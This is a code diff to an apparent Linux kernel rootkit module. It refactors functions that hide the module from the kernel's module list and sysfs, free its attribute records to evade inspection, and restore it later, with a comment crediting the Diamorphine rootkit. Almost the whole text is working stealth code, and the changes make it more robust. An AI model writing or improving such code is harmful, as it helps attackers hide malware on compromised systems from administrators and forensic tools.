@@ -19,37 +19,46 @@ MODULE_VERSION("0.01");
 static short hidden = 0;
 static struct list_head *prev_module;
 
-struct kobject mod_kobj;
-struct kobject *parent;
-
-// Store return value for kobject_create_and_add()
-struct kobject *returnval;
-const char *name;
+static struct kobject *mod_kobj_ptr;
+static struct kobject *parent;
+static const char *name;
 
 static inline void
 tidy(void) { // more sneaky beaky stuff (copied from Diamorphine)
   // Freeing
-  kfree(THIS_MODULE->notes_attrs);
-  THIS_MODULE->notes_attrs = NULL;
+  if (THIS_MODULE->notes_attrs) {
+    kfree(THIS_MODULE->notes_attrs);
+    THIS_MODULE->notes_attrs = NULL;
+  }
 
-  kfree(THIS_MODULE->sect_attrs);
-  THIS_MODULE->sect_attrs = NULL;
+  if (THIS_MODULE->sect_attrs) {
+    kfree(THIS_MODULE->sect_attrs);
+    THIS_MODULE->sect_attrs = NULL;
+  }
 
-  kfree(THIS_MODULE->mkobj.mp);
-  THIS_MODULE->mkobj.mp = NULL;
-  THIS_MODULE->modinfo_attrs->attr.name = NULL;
+  if (THIS_MODULE->mkobj.mp) {
+    kfree(THIS_MODULE->mkobj.mp);
+    THIS_MODULE->mkobj.mp = NULL;
+  }
 
-  kfree(THIS_MODULE->mkobj.drivers_dir);
-  THIS_MODULE->mkobj.drivers_dir = NULL;
+  if (THIS_MODULE->modinfo_attrs) {
+    THIS_MODULE->modinfo_attrs->attr.name = NULL;
+  }
+
+  if (THIS_MODULE->mkobj.drivers_dir) {
+    kfree(THIS_MODULE->mkobj.drivers_dir);
+    THIS_MODULE->mkobj.drivers_dir = NULL;
+  }
 }
+
 void hide_kobj(void) {
-  mod_kobj = (((struct module *)(THIS_MODULE))->mkobj).kobj;
-  name = mod_kobj.name;
-  parent = mod_kobj.parent;
+  name = THIS_MODULE->mkobj.kobj.name;
+  parent = THIS_MODULE->mkobj.kobj.parent;
 
   kobject_del(&THIS_MODULE->mkobj.kobj);
   list_del(&THIS_MODULE->mkobj.kobj.entry);
 }
+
 void hide_module(void) {
   prev_module = THIS_MODULE->list.prev;
   list_del(&THIS_MODULE->list);
@@ -58,7 +67,7 @@ void hide_module(void) {
   printk(KERN_INFO "sneaky beaky time..\n");
 }
 
-void unhide_kobj(void) { returnval = kobject_create_and_add(name, parent); }
+void unhide_kobj(void) { mod_kobj_ptr = kobject_create_and_add(name, parent); }
 
 void unhide(void) {
   list_add(&THIS_MODULE->list, prev_module);
